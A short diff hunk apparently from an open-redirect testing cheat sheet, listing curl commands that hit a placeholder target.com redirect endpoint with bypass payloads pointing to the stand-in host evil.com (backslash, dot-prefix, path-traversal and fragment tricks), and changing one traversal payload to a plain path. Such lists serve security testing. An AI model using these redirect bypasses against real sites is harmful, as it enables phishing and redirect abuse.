@@ -94,7 +94,7 @@ curl -v "http://target.com/redirect?url=/\evil.com"
 curl -v "http://target.com/redirect?url=/.evil.com"
 
 # Path traversal with redirect
-curl -v "http://target.com/redirect?url=/../../../evil.com"
+curl -v "http://target.com/redirect?url=/evil.com"
 
 # Fragment-based bypass
 curl -v "http://target.com/redirect?url=https://evil.com#target.com"
